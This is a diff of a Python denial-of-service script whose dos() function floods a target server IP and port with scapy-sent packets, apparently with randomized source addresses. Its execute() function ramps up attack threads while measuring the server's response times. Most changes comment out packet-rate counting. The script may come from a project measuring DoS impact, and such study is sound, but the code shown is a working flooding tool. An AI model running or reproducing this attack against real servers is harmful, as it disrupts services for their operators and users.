@@ -8,7 +8,7 @@ import threading
 import matplotlib.pyplot as plt
 
 global threads_run
-global packet_list
+# global packet_list
 
 
 def dos(server_ip, server_port):
@@ -21,10 +21,10 @@ def dos(server_ip, server_port):
             "\r\n"
         ).format(server_ip)
 
-        global packet_list
-        idx = len(packet_list)
-        packets = 0
-        packet_list.append(packets)
+        # global packet_list
+        # idx = len(packet_list)
+        # packets = 0
+        # packet_list.append(packets)
         global threads_run
         while threads_run:
             rand_num1 = random.randint(1, 254)
@@ -40,7 +40,7 @@ def dos(server_ip, server_port):
             send(_packet, verbose=0)
 
             # count packets
-            packet_list[idx] += 1
+            # packet_list[idx] += 1
     except:
         pass
 
@@ -75,10 +75,10 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
     global threads_run
     threads_run = True
 
-    global packet_list
-    packet_list = []
-    packets = 0
-    packet_list.append(packets)
+    # global packet_list
+    # packet_list = []
+    # packets = 0
+    # packet_list.append(packets)
 
     # server_port must be int
     server_port = int(server_port)
@@ -108,10 +108,10 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
     response_times_list = []
 
     # num of packets
-    packets_sum = 0
+    # packets_sum = 0
 
     # time list
-    time_list = [time.time(), time.time()]
+    # time_list = [time.time(), time.time()]
 
     # initialize dos threads
     for i in range(num_of_threads):
@@ -120,11 +120,10 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
     while _iter < (num_of_samples + 1):
         try:
             # calculate response times averages
-            while avg_iter < samples_for_avg:
+            while avg_iter <= samples_for_avg:
                 response_time = get_response_time(server_ip, server_port)
-                packet_list[0] += 1
+                # packet_list[0] += 1
                 if response_time is None:
-                    # print("error")
                     pass
                 else:
                     res_sum += response_time
@@ -142,16 +141,16 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
             # starting dos thread at the required time
             if num_of_samples > _iter >= response_avgs_between_threads and _iter % response_avgs_between_threads == 0:
                 thread_num = _iter // response_avgs_between_threads
-                time_list[1] = time.time()
-                time_interval = time_list[1] - time_list[0]
-                for idx, packet_count in enumerate(packet_list):
-                    packets_sum += packet_count
-                    packet_list[idx] = 0
-                time_list[0] = time.time()
+                # time_list[1] = time.time()
+                # time_interval = time_list[1] - time_list[0]
+                # for idx, packet_count in enumerate(packet_list):
+                #     packets_sum += packet_count
+                #     packet_list[idx] = 0
+                # time_list[0] = time.time()
                 # print(packets_sum)
                 # print(time_interval)
-                output.emit(f"the number of packets per second between {thread_num-1} threads to {thread_num} threads is {int(packets_sum//time_interval)}")
-                packets_sum = 0
+                # output.emit(f"the number of packets per second between {thread_num-1} threads to {thread_num} threads is {int(packets_sum//time_interval)}")
+                # packets_sum = 0
                 dos_threads[thread_num - 1].start()
                 if output:
                     output.emit(f"DoS thread number {thread_num} is running")
